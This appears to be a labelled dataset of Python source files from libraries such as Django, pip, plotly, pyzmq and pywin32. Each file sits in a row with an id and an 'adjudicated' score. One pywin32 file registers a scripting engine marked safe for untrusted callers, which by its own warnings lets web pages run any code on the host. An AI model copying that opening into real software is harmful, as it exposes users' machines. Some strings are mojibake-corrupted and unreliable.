from bacpypes3.settings import settings
from bacpypes3.debugging import bacpypes_debugging, ModuleLogger
from bacpypes3.argparse import ArgumentParser
from bacpypes3.console import Console, ConsolePDU
from bacpypes3.comm import Server, bind

# some debugging
_debug = 0
_log = ModuleLogger(globals())


@bacpypes_debugging
class Echo(Server[ConsolePDU]):
    """"""
    This example server echos downstream strings as uppercase strings going
    upstream.  If the PDU is None the console is finished, and this could send
    an integer status code upstream to exit.
    """"""

    _debug: Callable[..., None]

    async def indication(self, pdu: ConsolePDU) -> None:
        """"""
        This function is called with each line of text from the console (or
        from a file or pipe) and called with None at end-of-file.  It is
        ""downstream"" of the Console() instance and gets this ""indication"" when
        the console is making a ""request"".
        """"""
        if _debug:
            Echo._debug(""indication {!r}"".format(pdu))
        if pdu is None:
            return

        # send the uppercase content back up the stack
        await self.response(pdu.upper())


async def main() -> None:
    try:
        console = None
        args = ArgumentParser().parse_args()
        if _debug:
            _log.debug(""args: %r"", args)
            _log.debug(""settings: %r"", settings)

        # build a very small stack
        console = Console()
        echo = Echo()
        if _debug:
            _log.debug(""console, echo: %r, %r"", console, echo)

        # bind the two objects together, top down
        bind(console, echo)

        # run until the console is done, canceled or EOF
        await console.fini.wait()

    finally:
        if console and console.exit_status:
            sys.exit(console.exit_status)


if __name__ == ""__main__"":
    asyncio.run(main())"
488	adjudicated	0	"# coding: utf8
from __future__ import unicode_literals

from ...attrs import LIKE_NUM


_num_words = [
    ""zero"",
    ""um"",
    ""dois"",
    ""trÃªs"",
    ""tres"",
    ""quatro"",
    ""cinco"",
    ""seis"",
    ""sete"",
    ""oito"",
    ""nove"",
    ""dez"",
    ""onze"",
    ""doze"",
    ""dÃºzia"",
    ""dÃºzias"",
    ""duzia"",
    ""duzias"",
    ""treze"",
    ""catorze"",
    ""quinze"",
    ""dezasseis"",
    ""dezassete"",
    ""dezoito"",
    ""dezanove"",
    ""vinte"",
    ""trinta"",
    ""quarenta"",
    ""cinquenta"",
    ""sessenta"",
    ""setenta"",
    ""oitenta"",
    ""noventa"",
    ""cem"",
    ""cento"",
    ""duzentos"",
    ""trezentos"",
    ""quatrocentos"",
    ""quinhentos"",
    ""seicentos"",
    ""setecentos"",
    ""oitocentos"",
    ""novecentos"",
    ""mil"",
    ""milhÃ£o"",
    ""milhao"",
    ""milhÃµes"",
    ""milhoes"",
    ""bilhÃ£o"",
    ""bilhao"",
    ""bilhÃµes"",
    ""bilhoes"",
    ""trilhÃ£o"",
    ""trilhao"",
    ""trilhÃµes"",
    ""trilhoes"",
    ""quadrilhÃ£o"",
    ""quadrilhao"",
    ""quadrilhÃµes"",
    ""quadrilhoes"",
]


_ordinal_words = [
    ""primeiro"",
    ""segundo"",
    ""terceiro"",
    ""quarto"",
    ""quinto"",
    ""sexto"",
    ""sÃ©timo"",
    ""oitavo"",
    ""nono"",
    ""dÃ©cimo"",
    ""vigÃ©simo"",
    ""trigÃ©simo"",
    ""quadragÃ©simo"",
    ""quinquagÃ©simo"",
    ""sexagÃ©simo"",
    ""septuagÃ©simo"",
    ""octogÃ©simo"",
    ""nonagÃ©simo"",
    ""centÃ©simo"",
    ""ducentÃ©simo"",
    ""trecentÃ©simo"",
    ""quadringentÃ©simo"",
    ""quingentÃ©simo"",
    ""sexcentÃ©simo"",
    ""septingentÃ©simo"",
    ""octingentÃ©simo"",
    ""nongentÃ©simo"",
    ""milÃ©simo"",
    ""milionÃ©simo"",
    ""bilionÃ©simo"",
]


def like_num(text):
    if text.startswith((""+"", ""-"", ""Â±"", ""~"")):
        text = text[1:]
    text = text.replace("","", """").replace(""."", """").replace(""Âº"", """").replace(""Âª"", """")
    if text.isdigit():
        return True
    if text.count(""/"") == 1:
        num, denom = text.split(""/"")
        if num.isdigit() and denom.isdigit():
            return True
    if text.lower() in _num_words:
        return True
    if text.lower() in _ordinal_words:
        return True
    return False


LEX_ATTRS = {LIKE_NUM: like_num}"
498	adjudicated	2	"from django.conf import settings
from django.core import checks
from django.core.exceptions import FieldDoesNotExist
from django.db import models


class CurrentSiteManager(models.Manager):
    ""Use this to limit objects to those associated with the current site.""

    use_in_migrations = True

    def __init__(self, field_name=None):
        super().__init__()
        self.__field_name = field_name

    def check(self, **kwargs):
        errors = super().check(**kwargs)
        errors.extend(self._check_field_name())
        return errors

    def _check_field_name(self):
        field_name = self._get_field_name()
        try:
            field = self.model._meta.get_field(field_name)
        except FieldDoesNotExist:
            return [
                checks.Error(
                    ""CurrentSiteManager could not find a field named '%s'."" % field_name,
                    obj=self,
                    id='sites.E001',
                )
            ]

        if not field.many_to_many and not isinstance(field, (models.ForeignKey)):
            return [
                checks.Error(
                    ""CurrentSiteManager cannot use '%s.%s' as it is not a foreign key or a many-to-many field."" % (
                        self.model._meta.object_name, field_name
                    ),
                    obj=self,
                    id='sites.E002',
                )
            ]

        return []

    def _get_field_name(self):
        """""" Return self.__field_name or 'site' or 'sites'. """"""

        if not self.__field_name:
            try:
                self.model._meta.get_field('site')
            except FieldDoesNotExist:
                self.__field_name = 'sites'
            else:
                self.__field_name = 'site'
        return self.__field_name

    def get_queryset(self):
        return super().get_queryset().filter(**{self._get_field_name() + '__id': settings.SITE_ID})"
156	adjudicated	3	"# SPDX-License-Identifier: MIT


class FrozenError(AttributeError):
    """"""
    A frozen/immutable instance or attribute have been attempted to be
    modified.

    It mirrors the behavior of ``namedtuples`` by using the same error message
    and subclassing `AttributeError`.

    .. versionadded:: 20.1.0
    """"""

    msg = ""can't set attribute""
    args = [msg]


class FrozenInstanceError(FrozenError):
    """"""
    A frozen instance has been attempted to be modified.

    .. versionadded:: 16.1.0
    """"""


class FrozenAttributeError(FrozenError):
    """"""
    A frozen attribute has been attempted to be modified.

    .. versionadded:: 20.1.0
    """"""


class AttrsAttributeNotFoundError(ValueError):
    """"""
    An ``attrs`` function couldn't find an attribute that the user asked for.

    .. versionadded:: 16.2.0
    """"""


class NotAnAttrsClassError(ValueError):
    """"""
    A non-``attrs`` class has been passed into an ``attrs`` function.

    .. versionadded:: 16.2.0
    """"""


class DefaultAlreadySetError(RuntimeError):
    """"""
    A default has been set using ``attr.ib()`` and is attempted to be reset
    using the decorator.

    .. versionadded:: 17.1.0
    """"""


class UnannotatedAttributeError(RuntimeError):
    """"""
    A class with ``auto_attribs=True`` has an ``attr.ib()`` without a type
    annotation.

    .. versionadded:: 17.3.0
    """"""


class PythonTooOldError(RuntimeError):
    """"""
    It was attempted to use an ``attrs`` feature that requires a newer Python
    version.

    .. versionadded:: 18.2.0
    """"""


class NotCallableError(TypeError):
    """"""
    A ``attr.ib()`` requiring a callable has been set with a value
    that is not callable.

    .. versionadded:: 19.2.0
    """"""

    def __init__(self, msg, value):
        super(TypeError, self).__init__(msg, value)
        self.msg = msg
        self.value = value

    def __str__(self):
        return str(self.msg)"
387	adjudicated	2	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


# [START speech_quickstart_v2]
import io

from google.cloud.speech_v2 import SpeechClient
from google.cloud.speech_v2.types import cloud_speech


def quickstart_v2(project_id, recognizer_id, audio_file):
    # Instantiates a client
    client = SpeechClient()

    request = cloud_speech.CreateRecognizerRequest(
        parent=f""projects/{project_id}/locations/global"",
        recognizer_id=recognizer_id,
        recognizer=cloud_speech.Recognizer(
            language_codes=[""en-US""], model=""latest_long""
        ),
    )

    # Creates a Recognizer
    operation = client.create_recognizer(request=request)
    recognizer = operation.result()

    # Reads a file as bytes
    with io.open(audio_file, ""rb"") as f:
        content = f.read()

    config = cloud_speech.RecognitionConfig(auto_decoding_config={})

    request = cloud_speech.RecognizeRequest(
        recognizer=recognizer.name, config=config, content=content
    )

    # Transcribes the audio into text
    response = client.recognize(request=request)

    for result in response.results:
        print(""Transcript: {}"".format(result.alternatives[0].transcript))

    return response


# [END speech_quickstart_v2]


if __name__ == ""__main__"":
    quickstart_v2()"
16	adjudicated	3	"# Copyright 2015 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Sample App Engine application demonstrating how to use the Namespace Manager
API with Memcache.

For more information, see README.md.
""""""

# [START all]
from google.appengine.api import memcache
from google.appengine.api import namespace_manager
import webapp2


class MemcacheCounterHandler(webapp2.RequestHandler):
    """"""Increments counters in the global namespace as well as in whichever
    namespace is specified by the request, which is arbitrarily named 'default'
    if not specified.""""""

    def get(self, namespace='default'):
        global_count = memcache.incr('counter', initial_value=0)

        # Save the current namespace.
        previous_namespace = namespace_manager.get_namespace()
        try:
            namespace_manager.set_namespace(namespace)
            namespace_count = memcache.incr('counter', initial_value=0)
        finally:
            # Restore the saved namespace.
            namespace_manager.set_namespace(previous_namespace)

        self.response.write('Global: {}, Namespace {}: {}'.format(
            global_count, namespace, namespace_count))


app = webapp2.WSGIApplication([
    (r'/memcache', MemcacheCounterHandler),
    (r'/memcache/(.*)', MemcacheCounterHandler)
], debug=True)
# [END all]"
296	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""hoverlabel"", parent_name=""scatterternary"", **kwargs
    ):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
107	adjudicated	2	"import json

from django.core.serializers.json import DjangoJSONEncoder
from django.http import HttpResponse
try:
    from django.utils.encoding import force_unicode as force_text  # Django < 1.5
except ImportError as e:
    from django.utils.encoding import force_text  # Django 1.5 / python3
from django.utils.functional import Promise
from django.utils.cache import add_never_cache_headers
from django.views.generic.base import TemplateView

import logging
logger = logging.getLogger(__name__)


class LazyEncoder(DjangoJSONEncoder):
    """"""Encodes django's lazy i18n strings
    """"""
    def default(self, obj):
        if isinstance(obj, Promise):
            return force_text(obj)
        return super(LazyEncoder, self).default(obj)


class JSONResponseMixin(object):
    is_clean = False

    def render_to_response(self, context):
        """""" Returns a JSON response containing 'context' as payload
        """"""
        return self.get_json_response(context)

    def get_json_response(self, content, **httpresponse_kwargs):
        """""" Construct an `HttpResponse` object.
        """"""
        response = HttpResponse(content,
                                content_type='application/json',
                                **httpresponse_kwargs)
        add_never_cache_headers(response)
        return response

    def post(self, *args, **kwargs):
        return self.get(*args, **kwargs)

    def get(self, request, *args, **kwargs):
        self.request = request
        response = None

        func_val = self.get_context_data(**kwargs)
        if not self.is_clean:
            assert isinstance(func_val, dict)
            response = dict(func_val)
            if 'error' not in response and 'sError' not in response:
                response['result'] = 'ok'
            else:
                response['result'] = 'error'
        else:
            response = func_val

        dump = json.dumps(response, cls=LazyEncoder)
        return self.render_to_response(dump)


class JSONResponseView(JSONResponseMixin, TemplateView):
    pass"
47	adjudicated	3	"import re

# generated by scripts/generate_identifier_pattern.py
pattern = re.compile(
    r""[\wÂ·Ì-Í¯ÎÒ-ÒÖ-Ö½Ö¿×××××Ø-ØÙ-ÙÙ°Û-ÛÛ-Û¤Û§Û¨Ûª-Û­ÜÜ°-ÝÞ¦-Þ°ß«-ß³à -à à -à £à ¥-à §à ©-à ­à¡-à¡à£-à£¡à££-à¤à¤º-à¤¼à¤¾-à¥à¥-à¥à¥¢à¥£à¦-à¦à¦¼à¦¾-à§à§à§à§-à§à§à§¢à§£à¨-à¨à¨¼à¨¾-à©à©à©à©-à©à©à©°à©±à©µàª-àªàª¼àª¾-à«à«-à«à«-à«à«¢à«£à¬-à¬à¬¼à¬¾-à­à­à­à­-à­à­à­à­¢à­£à®à®¾-à¯à¯-à¯à¯-à¯à¯à°-à°à°¾-à±à±-à±à±-à±à±à±à±¢à±£à²-à²à²¼à²¾-à³à³-à³à³-à³à³à³à³¢à³£à´-à´à´¾-àµàµ-àµàµ-àµàµàµ¢àµ£à¶à¶à·à·-à·à·à·-à·à·²à·³à¸±à¸´-à¸ºà¹-à¹àº±àº´-àº¹àº»àº¼à»-à»à¼à¼à¼µà¼·à¼¹à¼¾à¼¿à½±-à¾à¾à¾à¾-à¾à¾-à¾¼à¿á«-á¾á-áá-á á¢-á¤á§-á­á±-á´á-ááá-áá-áá-áá²-á´ááá²á³á´-ááá -á á¢á¢á¢©á¤ -á¤«á¤°-á¤»á¨-á¨á©-á©á© -á©¼á©¿áª°-áª½á¬-á¬á¬´-á­á­«-á­³á®-á®á®¡-á®­á¯¦-á¯³á°¤-á°·á³-á³á³-á³¨á³­á³²-á³´á³¸á³¹á·-á·µá·»-á·¿â¿âââ-ââ¡â¥-â°ââ®â³¯-â³±âµ¿â· -â·¿ãª-ã¯ããê¯ê´-ê½êêê°ê±ê ê ê ê £-ê §ê¢ê¢ê¢´-ê£ê£ -ê£±ê¤¦-ê¤­ê¥-ê¥ê¦-ê¦ê¦³-ê§ê§¥ê¨©-ê¨¶ê©ê©ê©ê©»-ê©½êª°êª²-êª´êª·êª¸êª¾êª¿ê«ê««-ê«¯ê«µê«¶ê¯£-ê¯ªê¯¬ê¯­ï¬ï¸-ï¸ï¸ -ï¸¯ï¸³ï¸´ï¹-ï¹ï¼¿ð½ð ð¶-ðºð¨-ð¨ð¨ð¨ð¨-ð¨ð¨¸-ð¨ºð¨¿ð«¥ð«¦ð-ðð¸-ðð¿-ðð°-ðºð-ðð§-ð´ð³ð-ðð³-ðð-ðð¬-ð·ð¾ð-ðªð-ðð¼ð¾-ðððð-ððð¢ð£ð¦-ð¬ð°-ð´ðµ-ðð°-ðð¯-ðµð¸-ðððð°-ðð«-ð·ð-ð«ð°¯-ð°¶ð°¸-ð°¿ð²-ð²§ð²©-ð²¶ð«°-ð«´ð¬°-ð¬¶ð½-ð½¾ð¾-ð¾ð²ð²ð¥-ð©ð­-ð²ð»-ðð-ððª-ð­ð-ðð¨-ð¨¶ð¨»-ð©¬ð©µðªðª-ðªðª¡-ðª¯ð-ðð-ðð-ð¡ð£ð¤ð¦-ðªð£-ð£ð¥-ð¥ó -ó ¯]+""  # noqa: B950
)"
265	adjudicated	0	"# Copyright 2019 Google, LLC.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# NOTE:
# These tests are unit tests that mock Pub/Sub.
import base64
import json
import uuid

import mock
import pytest

import main


@pytest.fixture
def client():
    main.app.testing = True
    return main.app.test_client()


def test_empty_payload(client):
    r = client.post(""/"", json="""")
    assert r.status_code == 400


def test_invalid_payload(client):
    r = client.post(""/"", json={""nomessage"": ""invalid""})
    assert r.status_code == 400


def test_invalid_mimetype(client):
    r = client.post(""/"", json=""{ message: true }"")
    assert r.status_code == 400


@mock.patch(""image.blur_offensive_images"", mock.MagicMock(return_value=204))
def test_minimally_valid_message(client):
    data_json = json.dumps({""name"": True, ""bucket"": True})
    data = base64.b64encode(data_json.encode()).decode()

    r = client.post(""/"", json={""message"": {""data"": data}})
    assert r.status_code == 204


def test_call_to_blur_image(client, capsys):
    filename = str(uuid.uuid4())
    blur_bucket = ""blurred-bucket-"" + str(uuid.uuid4())

    data_json = json.dumps({""name"": filename, ""bucket"": blur_bucket})
    data = base64.b64encode(data_json.encode()).decode()

    r = client.post(""/"", json={""message"": {""data"": data}})
    assert r.status_code == 204

    out, _ = capsys.readouterr()
    assert f""The image {filename} was detected as OK"" in out"
325	adjudicated	1	"import pytest

import pandas as pd
import pandas._testing as tm


class TestDatetimeIndexFillNA:
    @pytest.mark.parametrize(""tz"", [""US/Eastern"", ""Asia/Tokyo""])
    def test_fillna_datetime64(self, tz):
        # GH 11343
        idx = pd.DatetimeIndex([""2011-01-01 09:00"", pd.NaT, ""2011-01-01 11:00""])

        exp = pd.DatetimeIndex(
            [""2011-01-01 09:00"", ""2011-01-01 10:00"", ""2011-01-01 11:00""]
        )
        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"")), exp)

        # tz mismatch
        exp = pd.Index(
            [
                pd.Timestamp(""2011-01-01 09:00""),
                pd.Timestamp(""2011-01-01 10:00"", tz=tz),
                pd.Timestamp(""2011-01-01 11:00""),
            ],
            dtype=object,
        )
        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"", tz=tz)), exp)

        # object
        exp = pd.Index(
            [pd.Timestamp(""2011-01-01 09:00""), ""x"", pd.Timestamp(""2011-01-01 11:00"")],
            dtype=object,
        )
        tm.assert_index_equal(idx.fillna(""x""), exp)

        idx = pd.DatetimeIndex([""2011-01-01 09:00"", pd.NaT, ""2011-01-01 11:00""], tz=tz)

        exp = pd.DatetimeIndex(
            [""2011-01-01 09:00"", ""2011-01-01 10:00"", ""2011-01-01 11:00""], tz=tz
        )
        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"", tz=tz)), exp)

        exp = pd.Index(
            [
                pd.Timestamp(""2011-01-01 09:00"", tz=tz),
                pd.Timestamp(""2011-01-01 10:00""),
                pd.Timestamp(""2011-01-01 11:00"", tz=tz),
            ],
            dtype=object,
        )
        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"")), exp)

        # object
        exp = pd.Index(
            [
                pd.Timestamp(""2011-01-01 09:00"", tz=tz),
                ""x"",
                pd.Timestamp(""2011-01-01 11:00"", tz=tz),
            ],
            dtype=object,
        )
        tm.assert_index_equal(idx.fillna(""x""), exp)"
234	adjudicated	0	"import string

from django.core.exceptions import ImproperlyConfigured
from django.template import Origin, TemplateDoesNotExist
from django.utils.html import conditional_escape

from .base import BaseEngine
from .utils import csrf_input_lazy, csrf_token_lazy


class TemplateStrings(BaseEngine):
    app_dirname = ""template_strings""

    def __init__(self, params):
        params = params.copy()
        options = params.pop(""OPTIONS"").copy()
        if options:
            raise ImproperlyConfigured(""Unknown options: {}"".format("", "".join(options)))
        super().__init__(params)

    def from_string(self, template_code):
        return Template(template_code)

    def get_template(self, template_name):
        tried = []
        for template_file in self.iter_template_filenames(template_name):
            try:
                with open(template_file, encoding=""utf-8"") as fp:
                    template_code = fp.read()
            except FileNotFoundError:
                tried.append(
                    (
                        Origin(template_file, template_name, self),
                        ""Source does not exist"",
                    )
                )
            else:
                return Template(template_code)
        raise TemplateDoesNotExist(template_name, tried=tried, backend=self)


class Template(string.Template):
    def render(self, context=None, request=None):
        if context is None:
            context = {}
        else:
            context = {k: conditional_escape(v) for k, v in context.items()}
        if request is not None:
            context[""csrf_input""] = csrf_input_lazy(request)
            context[""csrf_token""] = csrf_token_lazy(request)
        return self.safe_substitute(context)"
374	adjudicated	2	"# A version of the ActiveScripting engine that enables rexec support
# This version supports hosting by IE - however, due to Python's
# rexec module being neither completely trusted nor private, it is
# *not* enabled by default.
# As of Python 2.2, rexec is simply not available - thus, if you use this,
# a HTML page can do almost *anything* at all on your machine.

# You almost certainly do NOT want to use thus!

import pythoncom
from win32com.axscript import axscript
import winerror
from . import pyscript

INTERFACE_USES_DISPEX = 0x00000004  # Object knows to use IDispatchEx
INTERFACE_USES_SECURITY_MANAGER = (
    0x00000008  # Object knows to use IInternetHostSecurityManager
)


class PyScriptRExec(pyscript.PyScript):
    # Setup the auto-registration stuff...
    _reg_verprogid_ = ""Python.AXScript-rexec.2""
    _reg_progid_ = ""Python""  # Same ProgID as the standard engine.
    # 	_reg_policy_spec_ = default
    _reg_catids_ = [axscript.CATID_ActiveScript, axscript.CATID_ActiveScriptParse]
    _reg_desc_ = ""Python ActiveX Scripting Engine (with rexec support)""
    _reg_clsid_ = ""{69c2454b-efa2-455b-988c-c3651c4a2f69}""
    _reg_class_spec_ = ""win32com.axscript.client.pyscript_rexec.PyScriptRExec""
    _reg_remove_keys_ = [("".pys"",), (""pysFile"",)]
    _reg_threading_ = ""Apartment""

    def _GetSupportedInterfaceSafetyOptions(self):
        # print ""**** calling"", pyscript.PyScript._GetSupportedInterfaceSafetyOptions, ""**->"", pyscript.PyScript._GetSupportedInterfaceSafetyOptions(self)
        return (
            INTERFACE_USES_DISPEX
            | INTERFACE_USES_SECURITY_MANAGER
            | axscript.INTERFACESAFE_FOR_UNTRUSTED_DATA
            | axscript.INTERFACESAFE_FOR_UNTRUSTED_CALLER
        )


if __name__ == ""__main__"":
    print(""WARNING: By registering this engine, you are giving remote HTML code"")
    print(""the ability to execute *any* code on your system."")
    print()
    print(""You almost certainly do NOT want to do this."")
    print(""You have been warned, and are doing this at your own (significant) risk"")
    pyscript.Register(PyScriptRExec)"
73	adjudicated	3	"""""""HTTP cache implementation.
""""""

import os
from contextlib import contextmanager
from typing import Iterator, Optional

from pip._vendor.cachecontrol.cache import BaseCache
from pip._vendor.cachecontrol.caches import FileCache
from pip._vendor.requests.models import Response

from pip._internal.utils.filesystem import adjacent_tmp_file, replace
from pip._internal.utils.misc import ensure_dir


def is_from_cache(response: Response) -> bool:
    return getattr(response, ""from_cache"", False)


@contextmanager
def suppressed_cache_errors() -> Iterator[None]:
    """"""If we can't access the cache then we can just skip caching and process
    requests as if caching wasn't enabled.
    """"""
    try:
        yield
    except OSError:
        pass


class SafeFileCache(BaseCache):
    """"""
    A file based cache which is safe to use even when the target directory may
    not be accessible or writable.
    """"""

    def __init__(self, directory: str) -> None:
        assert directory is not None, ""Cache directory must not be None.""
        super().__init__()
        self.directory = directory

    def _get_cache_path(self, name: str) -> str:
        # From cachecontrol.caches.file_cache.FileCache._fn, brought into our
        # class for backwards-compatibility and to avoid using a non-public
        # method.
        hashed = FileCache.encode(name)
        parts = list(hashed[:5]) + [hashed]
        return os.path.join(self.directory, *parts)

    def get(self, key: str) -> Optional[bytes]:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            with open(path, ""rb"") as f:
                return f.read()

    def set(self, key: str, value: bytes) -> None:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            ensure_dir(os.path.dirname(path))

            with adjacent_tmp_file(path) as f:
                f.write(value)

            replace(f.name, path)

    def delete(self, key: str) -> None:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            os.remove(path)"
133	adjudicated	1	"""""""zmq Context class""""""

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

from zmq.constants import EINVAL, IO_THREADS
from zmq.error import InterruptedSystemCall, ZMQError, _check_rc

from ._cffi import ffi
from ._cffi import lib as C


class Context:
    _zmq_ctx = None
    _iothreads = None
    _closed = True
    _shadow = False

    def __init__(self, io_threads=1, shadow=None):

        if shadow:
            self._zmq_ctx = ffi.cast(""void *"", shadow)
            self._shadow = True
        else:
            self._shadow = False
            if not io_threads >= 0:
                raise ZMQError(EINVAL)

            self._zmq_ctx = C.zmq_ctx_new()
        if self._zmq_ctx == ffi.NULL:
            raise ZMQError(C.zmq_errno())
        if not shadow:
            C.zmq_ctx_set(self._zmq_ctx, IO_THREADS, io_threads)
        self._closed = False

    @property
    def underlying(self):
        """"""The address of the underlying libzmq context""""""
        return int(ffi.cast('size_t', self._zmq_ctx))

    @property
    def closed(self):
        return self._closed

    def set(self, option, value):
        """"""set a context option

        see zmq_ctx_set
        """"""
        rc = C.zmq_ctx_set(self._zmq_ctx, option, value)
        _check_rc(rc)

    def get(self, option):
        """"""get context option

        see zmq_ctx_get
        """"""
        rc = C.zmq_ctx_get(self._zmq_ctx, option)
        _check_rc(rc, error_without_errno=False)
        return rc

    def term(self):
        if self.closed:
            return

        rc = C.zmq_ctx_destroy(self._zmq_ctx)
        try:
            _check_rc(rc)
        except InterruptedSystemCall:
            # ignore interrupted term
            # see PEP 475 notes about close & EINTR for why
            pass

        self._zmq_ctx = None
        self._closed = True


__all__ = ['Context']"
22	adjudicated	0	"# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.
# pyre-unsafe

from typing import Any, Iterable, Mapping, Sequence

from viktor._vendor.libcst._parser.base_parser import BaseParser
from viktor._vendor.libcst._parser.grammar import get_nonterminal_conversions, get_terminal_conversions
from viktor._vendor.libcst._parser.parso.pgen2.generator import Grammar
from viktor._vendor.libcst._parser.parso.python.token import TokenType
from viktor._vendor.libcst._parser.types.config import ParserConfig
from viktor._vendor.libcst._parser.types.conversions import NonterminalConversion, TerminalConversion
from viktor._vendor.libcst._parser.types.token import Token


class PythonCSTParser(BaseParser[Token, TokenType, Any]):
    config: ParserConfig
    terminal_conversions: Mapping[str, TerminalConversion]
    nonterminal_conversions: Mapping[str, NonterminalConversion]

    def __init__(
        self,
        *,
        tokens: Iterable[Token],
        config: ParserConfig,
        pgen_grammar: ""Grammar[TokenType]"",
        start_nonterminal: str = ""file_input"",
    ) -> None:
        super().__init__(
            tokens=tokens,
            lines=config.lines,
            pgen_grammar=pgen_grammar,
            start_nonterminal=start_nonterminal,
        )
        self.config = config
        self.terminal_conversions = get_terminal_conversions()
        self.nonterminal_conversions = get_nonterminal_conversions(
            config.version, config.future_imports
        )

    def convert_nonterminal(self, nonterminal: str, children: Sequence[Any]) -> Any:
        return self.nonterminal_conversions[nonterminal](self.config, children)

    def convert_terminal(self, token: Token) -> Any:
        return self.terminal_conversions[token.type.name](self.config, token)"
162	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""choroplethmapbox.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
340	adjudicated	2	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the 'License');
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an 'AS IS' BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START functions_pubsub_integration_test]
import base64
import os
import subprocess
import uuid

import requests
from requests.packages.urllib3.util.retry import Retry


def test_print_name():
    name = str(uuid.uuid4())
    port = 8088  # Each running framework instance needs a unique port

    encoded_name = base64.b64encode(name.encode('utf-8')).decode('utf-8')
    pubsub_message = {
        'data': {'data': encoded_name}
    }

    process = subprocess.Popen(
      [
        'functions-framework',
        '--target', 'hello_pubsub',
        '--signature-type', 'event',
        '--port', str(port)
      ],
      cwd=os.path.dirname(__file__),
      stdout=subprocess.PIPE
    )

    # Send HTTP request simulating Pub/Sub message
    # (GCF translates Pub/Sub messages to HTTP requests internally)
    url = f'http://localhost:{port}/'

    retry_policy = Retry(total=6, backoff_factor=1)
    retry_adapter = requests.adapters.HTTPAdapter(
      max_retries=retry_policy)

    session = requests.Session()
    session.mount(url, retry_adapter)

    response = session.post(url, json=pubsub_message)

    assert response.status_code == 200

    # Stop the functions framework process
    process.kill()
    process.wait()
    out, err = process.communicate()

    print(out, err, response.content)

    assert f'Hello {name}!' in str(out)
# [END functions_pubsub_integration_test]"
200	adjudicated	4	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
